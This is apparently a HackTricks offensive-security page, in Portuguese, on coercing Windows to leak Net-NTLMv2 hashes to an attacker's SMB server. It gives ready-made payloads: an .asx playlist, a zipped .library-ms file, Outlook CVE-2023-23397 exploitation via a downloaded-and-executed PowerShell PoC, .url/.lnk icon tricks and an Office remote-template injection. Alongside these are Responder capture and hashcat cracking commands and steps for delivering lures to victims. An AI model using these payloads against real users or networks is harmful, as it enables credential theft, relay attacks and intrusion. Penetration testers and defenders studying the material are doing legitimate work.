# Locais para roubar NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Confira todas as ótimas ideias de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — desde o download de um microsoft word file online até a ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Playlists do Windows Media Player (.ASX/.WAX)

Se conseguir fazer com que um alvo abra ou visualize uma playlist do Windows Media Player que você controla, pode leak Net‑NTLMv2 apontando a entrada para um caminho UNC. O WMP tentará buscar a mídia referenciada via SMB e se autenticará implicitamente.

Exemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Fluxo de coleta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### Vazamento NTLM de .library-ms embutido em ZIP (CVE-2025-24071/24055)

O Windows Explorer trata de forma insegura arquivos .library-ms quando eles são abertos diretamente de dentro de um arquivo ZIP. Se a definição da library apontar para um caminho UNC remoto (por exemplo, \\attacker\share), simplesmente navegar/abrir o .library-ms dentro do ZIP faz com que o Explorer enumere o UNC e emita autenticação NTLM ao atacante. Isso gera um NetNTLMv2 que pode ser quebrado offline ou potencialmente relayed.

Exemplo mínimo de .library-ms apontando para um UNC do atacante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Passos operacionais
- Crie o arquivo .library-ms com o XML acima (defina seu IP/hostname).
- Compacte-o (no Windows: Send to → Compressed (zipped) folder) e entregue o ZIP ao alvo.
- Execute um listener de captura NTLM e aguarde a vítima abrir o .library-ms de dentro do ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

O Microsoft Outlook for Windows processava a propriedade MAPI estendida PidLidReminderFileParameter em itens de calendário. Se essa propriedade apontasse para um UNC path (por exemplo, \\attacker\share\alert.wav), o Outlook contataria o SMB share quando o lembrete disparasse, leaking o Net‑NTLMv2 do usuário sem qualquer clique. Isso foi corrigido em 14 de março de 2023, mas continua altamente relevante para frotas legadas/sem atualizações e para resposta a incidentes histórica.

Exploração rápida com PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado do Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- A vítima só precisa ter o Outlook for Windows em execução quando o lembrete disparar.
- O leak produz Net‑NTLMv2 adequado para offline cracking ou relay (não pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer exibe ícones de atalho automaticamente. Pesquisas recentes mostraram que, mesmo após o patch da Microsoft de abril de 2025 para atalhos com ícone UNC, ainda era possível acionar a autenticação NTLM sem cliques hospedando o alvo do atalho em um caminho UNC e mantendo o ícone local (o bypass do patch foi atribuído CVE‑2025‑50154). Apenas visualizar a pasta faz com que o Explorer recupere metadados do alvo remoto, emitindo NTLM para o servidor SMB do atacante.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Atalho de Programa payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Coloque o atalho em um ZIP e faça com que a vítima o abra.
- Coloque o atalho em um compartilhamento gravável que a vítima irá abrir.
- Combine com outros arquivos isca na mesma pasta para que o Explorer pré-visualize os itens.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Documentos do Office podem referenciar um template externo. Se você configurar o template anexado para um caminho UNC, abrir o documento irá autenticar para SMB.

Minimal DOCX relationship changes (inside word/):

1) Edite word/settings.xml e adicione a referência do template anexado:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edite word/_rels/settings.xml.rels e aponte rId1337 para o seu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempacote para .docx e entregue. Inicie seu SMB capture listener e aguarde a abertura.

Para ideias pós-captura sobre relaying ou abuso do NTLM, consulte:

{{#ref}}
README.md
{{#endref}}


## Referências
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
